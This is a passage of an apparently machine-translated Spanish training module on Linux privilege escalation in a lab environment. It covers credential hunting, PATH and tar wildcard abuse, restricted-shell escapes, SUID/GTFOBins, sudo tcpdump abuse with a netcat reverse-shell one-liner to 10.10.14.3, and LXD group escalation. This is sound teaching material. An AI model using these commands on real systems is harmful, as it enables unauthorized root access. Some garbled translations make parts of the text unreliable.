-rw-r--r-- 1 root root 71 Nov 28 12:31 /run/NetworkManager/resolv.conf
-rw-r--r-- 1 root root 72 Nov 28 12:31 /run/NetworkManager/no-stub-resolv.conf
-rw-r--r-- 1 root root 0 Nov 28 12:37 /run/NetworkManager/conf.d/10-globally-managed-devices.conf
-rw-r--r-- 1 systemd-resolve systemd-resolve 736 Nov 28 12:31 /run/systemd/resolve/stub-resolv.conf
-rw-r--r-- 1 systemd-resolve systemd-resolve 607 Nov 28 12:31 /run/systemd/resolve/resolv.conf
...SNIP...
```

Los scripts son similares a los archivos de configuración. A menudo, los administradores son perezosos y están convencidos de la seguridad de la red y descuidan la seguridad interna de sus sistemas. Estos scripts, en algunos casos, tienen privilegios tan erróneos que trataremos más adelante, pero los contenidos son de gran importancia incluso sin estos privilegios. Porque a través de ellos, podemos descubrir procesos internos e individuales que pueden ser de gran utilidad para nosotros.

#### Guiones

  Servicios Linux y Enumeración de Internos

```shell-session
vcrdcr@htb[/htb]$ find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

/home/htb-student/automation.sh
/etc/wpa_supplicant/action_wpa.sh
/etc/wpa_supplicant/ifupdown.sh
/etc/wpa_supplicant/functions.sh
/etc/init.d/keyboard-setup.sh
/etc/init.d/console-setup.sh
/etc/init.d/hwclock.sh
...SNIP...
```

Además, si miramos la lista de procesos, puede darnos información sobre qué scripts o binarios están en uso y por qué usuario. Así, por ejemplo, si se trata de un script creado por el administrador en su camino y cuyos derechos no han sido restringidos, podemos ejecutarlo sin entrar en el `root` directorio.

#### Ejecución de Servicios por Usuario

  Servicios Linux y Enumeración de Internos

```shell-session
vcrdcr@htb[/htb]$ ps aux | grep root

...SNIP...
root           1  2.0  0.2 168196 11364 ?        Ss   12:31   0:01 /sbin/init splash
root         378  0.5  0.4  62648 17212 ?        S<s  12:31   0:00 /lib/systemd/systemd-journald
root         409  0.8  0.1  25208  7832 ?        Ss   12:31   0:00 /lib/systemd/systemd-udevd
root         457  0.0  0.0 150668   284 ?        Ssl  12:31   0:00 vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid
root         752  0.0  0.2  58780 10608 ?        Ss   12:31   0:00 /usr/bin/VGAuthService
root         755  0.0  0.1 248088  7448 ?        Ssl  12:31   0:00 /usr/bin/vmtoolsd
root         772  0.0  0.2 250528  9388 ?        Ssl  12:31   0:00 /usr/lib/accountsservice/accounts-daemon
root         773  0.0  0.0   2548   768 ?        Ss   12:31   0:00 /usr/sbin/acpid
root         774  0.0  0.0  16720   708 ?        Ss   12:31   0:00 /usr/sbin/anacron -d -q -s
root         778  0.0  0.0  18052  2992 ?        Ss   12:31   0:00 /usr/sbin/cron -f
root         779  0.0  0.2  37204  8964 ?        Ss   12:31   0:00 /usr/sbin/cupsd -l
root         784  0.4  0.5 273512 21680 ?        Ssl  12:31   0:00 /usr/sbin/NetworkManager --no-daemon
root         790  0.0  0.0  81932  3648 ?        Ssl  12:31   0:00 /usr/sbin/irqbalance --foreground
root         792  0.1  0.5  48244 20540 ?        Ss   12:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         793  1.3  0.2 239180 11832 ?        Ssl  12:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
root         806  2.1  1.1 1096292 44976 ?       Ssl  12:31   0:01 /usr/lib/snapd/snapd
root         807  0.0  0.1 244352  6516 ?        Ssl  12:31   0:00 /usr/libexec/switcheroo-control
root         811  0.1  0.2  17412  8112 ?        Ss   12:31   0:00 /lib/systemd/systemd-logind
root         817  0.0  0.3 396156 14352 ?        Ssl  12:31   0:00 /usr/lib/udisks2/udisksd
root         818  0.0  0.1  13684  4876 ?        Ss   12:31   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
root         871  0.1  0.3 319236 13828 ?        Ssl  12:31   0:00 /usr/sbin/ModemManager
root         875  0.0  0.3 178392 12748 ?        Ssl  12:31   0:00 /usr/sbin/cups-browsed
root         889  0.1  0.5 126676 22888 ?        Ssl  12:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root         906  0.0  0.2 248244  8736 ?        Ssl  12:31   0:00 /usr/sbin/gdm3
root        1137  0.0  0.2 252436  9424 ?        Ssl  12:31   0:00 /usr/lib/upower/upowerd
root        1257  0.0  0.4 293736 16316 ?        Ssl  12:31   0:00 /usr/lib/packagekit/packagekitd
```

---

Esto nos daría una visión general bastante buena de nuestro sistema de destino, para que podamos entrar en más detalles a continuación y averiguar los permisos individuales para los componentes que encontramos.


# Caza de Credenciales

---

Al enumerar un sistema, es importante anotar cualquier credencial. Estos se pueden encontrar en los archivos de configuración (`.conf`, `.config`, `.xml`, etc.), scripts de shell, un archivo de historial de bash de un usuario, copia de seguridad (`.bak`) archivos, dentro de archivos de base de datos o incluso en archivos de texto. Las credenciales pueden ser útiles para escalar a otros usuarios o incluso root, acceder a bases de datos y otros sistemas dentro del entorno.

El directorio /var normalmente contiene la raíz web para cualquier servidor web que se esté ejecutando en el host. La raíz web puede contener credenciales de base de datos u otros tipos de credenciales que se pueden aprovechar para obtener más acceso. Un ejemplo común son las credenciales de la base de datos MySQL dentro de los archivos de configuración de WordPress:

  Caza de Credenciales

```shell-session
htb_student@NIX02:~$ cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'

define( 'DB_USER', 'wordpressuser' );
define( 'DB_PASSWORD', 'WPadmin123!' );
```

El carrete o los directorios de correo, si son accesibles, también pueden contener información valiosa o incluso credenciales. Es común encontrar credenciales almacenadas en archivos en la raíz web (es decir. Cadenas de conexión MySQL, archivos de configuración de WordPress).

  Caza de Credenciales

```shell-session
htb_student@NIX02:~$  find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null

/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/python3/debian_config
/etc/kbd/config
/etc/manpath.config
/boot/config-4.4.0-116-generic
/boot/grub/i386-pc/configfile.mod
/sys/devices/pci0000:00/0000:00:00.0/config
/sys/devices/pci0000:00/0000:00:01.0/config
<SNIP>
```

---

## Llaves SSH

También es útil buscar en todo el sistema claves privadas SSH accesibles. Podemos localizar una clave privada para otro usuario más privilegiado que podamos usar para conectarnos de nuevo a la caja con privilegios adicionales. A veces también podemos encontrar claves SSH que se pueden usar para acceder a otros hosts en el entorno. Siempre que encuentre claves SSH, verifique el `known_hosts` archivo para encontrar objetivos. Este archivo contiene una lista de claves públicas para todos los hosts a los que el usuario se ha conectado en el pasado y puede ser útil para el movimiento lateral o para encontrar datos en un host remoto que se pueden utilizar para realizar una escalada de privilegios en nuestro objetivo.

  Caza de Credenciales

```shell-session
htb_student@NIX02:~$  ls ~/.ssh

id_rsa  id_rsa.pub  known_hosts
```


# Abuso de Sendero

---

[CAMINO](http://www.linfo.org/path_env_var.html) es una variable de entorno que especifica el conjunto de directorios donde se puede ubicar un ejecutable. La variable PATH de una cuenta es un conjunto de rutas absolutas, lo que permite a un usuario escribir un comando sin especificar la ruta absoluta al binario. Por ejemplo, un usuario puede escribir `cat /tmp/test.txt` en lugar de especificar el camino absoluto `/bin/cat /tmp/test.txt`. Podemos comprobar el contenido de la variable PATH escribiendo `env | grep PATH` o `echo $PATH`.

  Abuso de Sendero

```shell-session
htb_student@NIX02:~$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

Crear un script o programa en un directorio especificado en el PATH lo hará ejecutable desde cualquier directorio del sistema.

  Abuso de Sendero

```shell-session
htb_student@NIX02:~$ pwd && conncheck 

/usr/local/sbin
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1189/sshd       
tcp        0     88 10.129.2.12:22          10.10.14.3:43218        ESTABLISHED 1614/sshd: mrb3n [p
tcp6       0      0 :::22                   :::*                    LISTEN      1189/sshd       
tcp6       0      0 :::80                   :::*                    LISTEN      1304/apache2    
```

Como se muestra a continuación, el `conncheck` script creado en `/usr/local/sbin` todavía correrá cuando esté en el `/tmp` directorio porque fue creado en un directorio especificado en el PATH.

  Abuso de Sendero

```shell-session
htb_student@NIX02:~$ pwd && conncheck 

/tmp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1189/sshd       
tcp        0    268 10.129.2.12:22          10.10.14.3:43218        ESTABLISHED 1614/sshd: mrb3n [p
tcp6       0      0 :::22                   :::*                    LISTEN      1189/sshd       
tcp6       0      0 :::80                   :::*                    LISTEN      1304/apache2     
```

Añadiendo `.` a la PATH de un usuario agrega su directorio de trabajo actual a la lista. Por ejemplo, si podemos modificar la ruta de un usuario, podríamos reemplazar un binario común como `ls` con un script malicioso como un shell inverso. Si agregamos `.` a la ruta emitiendo el comando `PATH=.:$PATH` y luego `export PATH`, podremos ejecutar binarios ubicados en nuestro directorio de trabajo actual simplemente escribiendo el nombre del archivo (es decir, simplemente escribiendo `ls` llamará al script malicioso nombrado `ls` en el directorio de trabajo actual en lugar del binario ubicado en `/bin/ls`).

  Abuso de Sendero

```shell-session
htb_student@NIX02:~$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

  Abuso de Sendero

```shell-session
htb_student@NIX02:~$ PATH=.:${PATH}
htb_student@NIX02:~$ export PATH
htb_student@NIX02:~$ echo $PATH

.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

En este ejemplo, modificamos la ruta para ejecutar un simple `echo` comando cuando el comando `ls` está escrito.

  Abuso de Sendero

```shell-session
htb_student@NIX02:~$ touch ls
htb_student@NIX02:~$ echo 'echo "PATH ABUSE!!"' > ls
htb_student@NIX02:~$ chmod +x ls
```

  Abuso de Sendero

```shell-session
htb_student@NIX02:~$ ls

PATH ABUSE!!
```


# Abuso de Wildcard

---

Un carácter comodín se puede utilizar como un reemplazo para otros caracteres y son interpretados por el shell antes de otras acciones. Ejemplos de comodines incluyen:

|**Carácter**|**Importancia**|
|---|---|
|`*`|Un asterisco que puede coincidir con cualquier número de caracteres en un nombre de archivo.|
|`?`|Coincide con un solo personaje.|
|`[ ]`|Los soportes encierran caracteres y pueden coincidir con uno solo en la posición definida.|
|`~`|Una tilde al principio se expande al nombre del directorio de inicio del usuario o puede tener otro nombre de usuario adjunto para referirse al directorio de inicio de ese usuario.|
|`-`|Un guión entre paréntesis denotará un rango de caracteres.|

Un ejemplo de cómo se puede abusar de los comodines para la escalada de privilegios es el `tar` comando, un programa común para crear/extraer archivos. Si miramos el [página de manual](http://man7.org/linux/man-pages/man1/tar.1.html) para el `tar` comando, vemos lo siguiente:

  Abuso de Wildcard

```shell-session
htb_student@NIX02:~$ man tar

<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
```

El `--checkpoint-action` la opción permite un `EXEC` acción que se ejecutará cuando se alcance un punto de control (es decir, ejecute un comando arbitrario del sistema operativo una vez que se ejecute el comando tar) Al crear archivos con estos nombres, cuando se especifica el comodín, `--checkpoint=1` y `--checkpoint-action=exec=sh root.sh` se pasa a `tar` como opciones de línea de comandos. Veamos esto en la práctica.

Considere el siguiente trabajo cron, que está configurado para hacer una copia de seguridad del `/home/htb-student` contenido del directorio y crear un archivo comprimido dentro `/home/htb-student`. El trabajo cron está configurado para ejecutarse cada minuto, por lo que es un buen candidato para la escalada de privilegios.

  Abuso de Wildcard

```shell-session
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

Podemos aprovechar el comodín en el trabajo cron para escribir los comandos necesarios como nombres de archivo con lo anterior en mente. Cuando se ejecuta el trabajo cron, estos nombres de archivo se interpretarán como argumentos y ejecutarán los comandos que especifiquemos.

  Abuso de Wildcard

```shell-session
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1
```

Podemos comprobar y ver que se crearon los archivos necesarios.

  Abuso de Wildcard

```shell-session
htb-student@NIX02:~$ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
```

Una vez que el trabajo cron se ejecuta nuevamente, podemos verificar los privilegios de sudo recién agregados y sudo para rootear directamente.

  Abuso de Wildcard

```shell-session
htb-student@NIX02:~$ sudo -l

Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL
```


# Escapando de Conchas Restringidas

---

Un shell restringido es un tipo de shell que limita la capacidad del usuario para ejecutar comandos. En un shell restringido, el usuario solo puede ejecutar un conjunto específico de comandos o solo puede ejecutar comandos en directorios específicos. Los shells restringidos a menudo se utilizan para proporcionar un entorno seguro para los usuarios que pueden dañar accidental o intencionalmente el sistema o proporcionar una forma para que los usuarios accedan solo a ciertas características del sistema. Algunos ejemplos comunes de conchas restringidas incluyen el `rbash` shell en Linux y el "Sell de acceso restringido" en Windows.

#### RÁFAGA

[Shell Bourne restringido](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html) (`rbash`) es una versión restringida del shell Bourne, un intérprete de línea de comandos estándar en Linux que limita la capacidad del usuario para usar ciertas características del shell Bourne, como cambiar directorios, establecer o modificar variables de entorno y ejecutar comandos en otros directorios. A menudo se utiliza para proporcionar un entorno seguro y controlado para los usuarios que pueden dañar accidental o intencionalmente el sistema.

#### RKSH

[Concha Korn restringida](https://www.ibm.com/docs/en/aix/7.2?topic=r-rksh-command) (`rksh`) es una versión restringida del shell Korn, otro intérprete de línea de comandos estándar. El `rksh` shell limita la capacidad del usuario para usar ciertas características del shell Korn, como ejecutar comandos en otros directorios, crear o modificar funciones de shell y modificar el entorno del shell.

#### RZSH

[Shell Z restringido](https://manpages.debian.org/experimental/zsh/rzsh.1.en.html) (`rzsh`) es una versión restringida del shell Z y es el intérprete de línea de comandos más potente y flexible. El `rzsh` shell limita la capacidad del usuario para usar ciertas características del shell Z, como ejecutar scripts de shell, definir alias y modificar el entorno del shell.

Por ejemplo, los administradores a menudo usan shells restringidos en redes empresariales para proporcionar un entorno seguro y controlado para los usuarios que pueden dañar accidental o intencionalmente el sistema. Al limitar la capacidad del usuario para ejecutar comandos específicos o acceder a ciertos directorios, los administradores pueden garantizar que los usuarios no puedan realizar acciones que puedan dañar el sistema o comprometer la seguridad de la red. Además, los shells restringidos pueden dar a los usuarios acceso solo a ciertas características del sistema, lo que permite a los administradores controlar qué recursos y funciones están disponibles para cada usuario.

Imagine una empresa con una red de servidores Linux que alojan aplicaciones y servicios empresariales críticos. Muchos usuarios, incluidos empleados, contratistas y socios externos, acceden a la red. Para proteger la seguridad y la integridad de la red, el equipo de TI de la organización decidió implementar shells restringidos para todos los usuarios.

Para hacer esto, el equipo de TI establece varios `rbash`, `rksh`, y `rzsh` shells en la red y asigna cada usuario a un shell específico. Por ejemplo, se asignan socios externos que necesitan acceder solo a ciertas funciones de red, como el correo electrónico y el intercambio de archivos `rbash` shells, lo que limita su capacidad para ejecutar comandos específicos y acceder a ciertos directorios. Los contratistas que necesitan acceder a funciones de red más avanzadas, como servidores de bases de datos y servidores web, están asignados a `rksh` shells, que les proporcionan más flexibilidad pero aún limitan sus habilidades. Finalmente, los empleados que necesitan acceder a la red para fines específicos, como ejecutar aplicaciones o scripts específicos, se asignan a `rzsh`shells, que les proporcionan la mayor flexibilidad pero aún limitan su capacidad para ejecutar comandos específicos y acceder a ciertos directorios.

Se pueden usar varios métodos para escapar de una carcasa restringida. Algunos de estos métodos implican la explotación de vulnerabilidades en el propio shell, mientras que otros implican el uso de técnicas creativas para eludir las restricciones impuestas por el shell. Aquí hay algunos ejemplos de métodos que se pueden usar para escapar de un shell restringido.

---

## Escapando

En algunos casos, puede ser posible escapar de un shell restringido inyectando comandos en la línea de comandos u otras entradas que acepte el shell. Por ejemplo, supongamos que el shell permite a los usuarios ejecutar comandos pasándolos como argumentos a un comando incorporado. En ese caso, puede ser posible escapar del shell inyectando comandos adicionales en el argumento.

#### Inyección de comando

Imagine que estamos en un shell restringido que nos permite ejecutar comandos pasándolos como argumentos a la `ls` comando. Desafortunadamente, el shell solo nos permite ejecutar el `ls` comando con un conjunto específico de argumentos, como `ls -l` o `ls -a`, pero no nos permite ejecutar ningún otro comando. En esta situación, podemos usar la inyección de comandos para escapar del shell inyectando comandos adicionales en el argumento de la `ls` comando.

Por ejemplo, podríamos usar el siguiente comando para inyectar un `pwd` comando en el argumento de la `ls` comando:

  Escapando de Conchas Restringidas

```shell-session
vcrdcr@htb[/htb]$ ls -l `pwd` 
```

Este comando causaría el `ls` comando a ejecutar con el argumento `-l`, seguido de la salida de la `pwd` comando. Desde el `pwd` el comando no está restringido por el shell, esto nos permitiría ejecutar el `pwd` ordene y vea el directorio de trabajo actual, a pesar de que el shell no nos permite ejecutar el `pwd` comanda directamente.

#### Sustitución de Comando

Otro método para escapar de un shell restringido es usar sustitución de comandos. Esto implica usar la sintaxis de sustitución de comandos del shell para ejecutar un comando. Por ejemplo, imagine que el shell permite a los usuarios ejecutar comandos encerrándolos en backticks ('). En ese caso, puede ser posible escapar del shell ejecutando un comando en una sustitución de backtick que no esté restringida por el shell.

#### Encadenamiento de Comando

En algunos casos, puede ser posible escapar de un shell restringido mediante el uso de encadenamiento de comandos. Necesitaríamos usar múltiples comandos en una sola línea de comandos, separados por un metacaracter de shell, como un punto y coma (`;`) o una barra vertical (`|`), para ejecutar un comando. Por ejemplo, si el shell permite a los usuarios ejecutar comandos separados por punto y coma, puede ser posible escapar del shell utilizando un punto y coma para separar dos comandos, uno de los cuales no está restringido por el shell.

#### Variables de Medio Ambiente

Para escapar de un shell restringido para usar variables de entorno implica modificar o crear variables de entorno que el shell utiliza para ejecutar comandos que no están restringidos por el shell. Por ejemplo, si el shell utiliza una variable de entorno para especificar el directorio en el que se ejecutan los comandos, puede ser posible escapar del shell modificando el valor de la variable de entorno para especificar un directorio diferente.

#### Funciones de Shell

En algunos casos, puede ser posible escapar de un shell restringido mediante el uso de funciones de shell. Para esto podemos definir y llamar a funciones de shell que ejecutan comandos no restringidos por el shell. Digamos que el shell permite a los usuarios definir y llamar a las funciones de shell, es posible escapar del shell definiendo una función de shell que ejecuta un comando.



# Permisos Especiales

---

El `Set User ID upon Execution` (`setuid`) el permiso puede permitir que un usuario ejecute un programa o script con los permisos de otro usuario, generalmente con privilegios elevados. El `setuid` bit aparece como un `s`.

  Permisos Especiales

```shell-session
vcrdcr@htb[/htb]$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-xr-x 1 root root 16728 Sep  1 19:06 /home/htb-student/shared_obj_hijack/payroll
-rwsr-xr-x 1 root root 16728 Sep  1 22:05 /home/mrb3n/payroll
-rwSr--r-- 1 root root 0 Aug 31 02:51 /home/cliff.moore/netracer
-rwsr-xr-x 1 root root 40152 Nov 30  2017 /bin/mount
-rwsr-xr-x 1 root root 40128 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 27608 Nov 30  2017 /bin/umount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14864 Jan 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 428240 Jan 18  2018 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 23376 Jan 18  2016 /usr/bin/pkexec
-rwsr-sr-x 1 root root 240 Feb  1  2016 /usr/bin/facter
-rwsr-xr-x 1 root root 39904 May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 49584 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 75304 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 54256 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 10624 May  9  2018 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 1588768 Aug 31 00:50 /usr/bin/screen-4.5.0
-rwsr-xr-x 1 root root 94240 Jun  9 14:54 /sbin/mount.nfs
```

Es posible realizar ingeniería inversa del programa con el conjunto de bits SETUID, identificar una vulnerabilidad y explotar esto para escalar nuestros privilegios. Muchos programas tienen características adicionales que se pueden aprovechar para ejecutar comandos y, si el `setuid` bit se establece en ellos, estos se pueden utilizar para nuestro propósito.

El permiso Set-Group-ID (setgid) es otro permiso especial que nos permite ejecutar binarios como si fuéramos parte del grupo que los creó. Estos archivos se pueden enumerar utilizando el siguiente comando: `find / -uid 0 -perm -6000 -type f 2>/dev/null`. Estos archivos se pueden aprovechar de la misma manera que `setuid` binarios para escalar privilegios.

  Permisos Especiales

```shell-session
vcrdcr@htb[/htb]$ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine
```

Esto [recurso](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits) tiene más información sobre el `setuid` y `setgid` bits, incluyendo cómo configurar los bits.

---

## GTFOBinas

El [GTFOBinas](https://gtfobins.github.io/) project es una lista curada de binarios y scripts que un atacante puede usar para eludir las restricciones de seguridad. Cada página detalla las características del programa que se pueden usar para salir de shells restringidos, escalar privilegios, generar conexiones de shell inversas y transferir archivos. Por ejemplo, `apt-get` se puede usar para salir de entornos restringidos y generar un shell agregando un comando Pre-Invoke:

  Permisos Especiales

```shell-session
vcrdcr@htb[/htb]$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

# id
uid=0(root) gid=0(root) groups=0(root)
```

Vale la pena familiarizarnos con tantos GTFOBins como sea posible para identificar rápidamente las configuraciones erróneas cuando aterrizamos en un sistema que debemos escalar nuestros privilegios para avanzar más.



# Abuso de los Derechos de Sudo

---

Los privilegios de sudo se pueden otorgar a una cuenta, permitiendo que la cuenta ejecute ciertos comandos en el contexto de la raíz (u otra cuenta) sin tener que cambiar de usuario o otorgar privilegios excesivos. Cuando el `sudo` se emite el comando, el sistema verificará si el usuario que emite el comando tiene los derechos apropiados, según lo configurado en `/etc/sudoers`. Al aterrizar en un sistema, siempre debemos verificar si el usuario actual tiene algún privilegio sudo escribiendo `sudo -l`. A veces necesitaremos saber la contraseña del usuario para enumerar su `sudo` derechos, pero cualquier entrada de derechos con el `NOPASSWD` la opción se puede ver sin ingresar una contraseña.

  Abuso de los Derechos de Sudo

```shell-session
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

Es fácil configurar mal esto. Por ejemplo, a un usuario se le pueden otorgar permisos de nivel raíz sin requerir una contraseña. O la línea de comandos permitida podría especificarse demasiado libremente, lo que nos permite ejecutar un programa de una manera involuntaria, lo que resulta en una escalada de privilegios. Por ejemplo, si el archivo sudoers se edita para otorgar a un usuario el derecho de ejecutar un comando como `tcpdump` por la siguiente entrada en el archivo sudoers: `(ALL) NOPASSWD: /usr/sbin/tcpdump` un atacante podría aprovechar esto para aprovechar un **postrotato-comando** opción.

  Abuso de los Derechos de Sudo

```shell-session
htb_student@NIX02:~$ man tcpdump

<SNIP> 
-z postrorate-command              

Used in conjunction with the -C or -G options, this will make `tcpdump` run " postrotate-command file " where the file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2 will compress each savefile using gzip or bzip2.
```

Especificando el `-z` flag, un atacante podría usar `tcpdump` para ejecutar un script de shell, obtenga un shell inverso como usuario raíz o ejecute otros comandos privilegiados. Por ejemplo, un atacante podría crear el script de shell `.test` conteniendo un shell inverso y ejecutarlo de la siguiente manera:

  Abuso de los Derechos de Sudo

```shell-session
htb_student@NIX02:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

Probemos esto. Primero, haga un archivo para ejecutar con el `postrotate-command`, añadiendo un simple shell inverso de una sola línea.

  Abuso de los Derechos de Sudo

```shell-session
htb_student@NIX02:~$ cat /tmp/.test

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```

A continuación, comienza un `netcat` oyente en nuestra caja de ataque y corre `tcpdump` como raíz con el `postrotate-command`. Si todo va según lo planeado, recibiremos una conexión de shell inversa raíz.

  Abuso de los Derechos de Sudo

```shell-session
htb_student@NIX02:~$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

dropped privs to root
tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
6 packets received by filter
compress_savefile: execlp(/tmp/.test, /dev/null) failed: Permission denied
0 packets dropped by kernel
```

Recibimos una cáscara de raíz casi al instante.

  Abuso de los Derechos de Sudo

```shell-session
vcrdcr@htb[/htb]$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938
bash: cannot set terminal process group (10797): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id && hostname               
id && hostname
uid=0(root) gid=0(root) groups=0(root)
NIX02
```

[AppArmor](https://wiki.ubuntu.com/AppArmor) en distribuciones más recientes ha predefinido los comandos utilizados con el `postrotate-command`, evitando efectivamente la ejecución de comandos. Dos mejores prácticas que siempre deben considerarse al aprovisionamiento `sudo` derechos:

|||
|---|---|
|1.|Siempre especifique la ruta absoluta a cualquier binario listado en el `sudoers` entrada de archivo. De lo contrario, un atacante podría aprovechar el abuso PATH (que veremos en la siguiente sección) para crear un binario malicioso que se ejecutará cuando se ejecute el comando (es decir, si el `sudoers` la entrada especifica `cat` en lugar de `/bin/cat` esto probablemente podría ser abusado).|
|2.|Subvención `sudo` derechos con moderación y basados en el principio de menor privilegio. El usuario necesita lleno `sudo` ¿derechos? Todavía pueden realizar su trabajo con una o dos entradas en el `sudoers` ¿archivo? Limitar el comando privilegiado que un usuario puede ejecutar reducirá en gran medida la probabilidad de una escalada de privilegios exitosa.|


# Grupos Privilegiados

---

## LXC/LXD

LXD es similar a Docker y es el administrador de contenedores de Ubuntu. Tras la instalación, todos los usuarios se agregan al grupo LXD. La membresía de este grupo se puede utilizar para escalar privilegios creando un contenedor LXD, haciéndolo privilegiado y luego accediendo al sistema de archivos host en `/mnt/root`. Confirmemos la membresía del grupo y usemos estos derechos para escalar a root.

  Grupos Privilegiados

```shell-session
devops@NIX02:~$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

Descomprime la imagen alpina.

  Grupos Privilegiados

```shell-session
devops@NIX02:~$ unzip alpine.zip 

Archive:  alpine.zip
extracting: 64-bit Alpine/alpine.tar.gz  
inflating: 64-bit Alpine/alpine.tar.gz.root  
cd 64-bit\ Alpine/
```

Inicie el proceso de inicialización de LXD. Elija los valores predeterminados para cada mensaje. Consulta esto [publicar](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) para más información sobre cada paso.

  Grupos Privilegiados

```shell-session
devops@NIX02:~$ lxd init

Do you want to configure a new storage pool (yes/no) [default=yes]? yes
Name of the storage backend to use (dir or zfs) [default=dir]: dir
Would you like LXD to be available over the network (yes/no) [default=no]? no
Do you want to configure the LXD bridge (yes/no) [default=yes]? yes

/usr/sbin/dpkg-reconfigure must be run as root
error: Failed to configure the bridge
```

Importar la imagen local.

  Grupos Privilegiados

```shell-session
devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
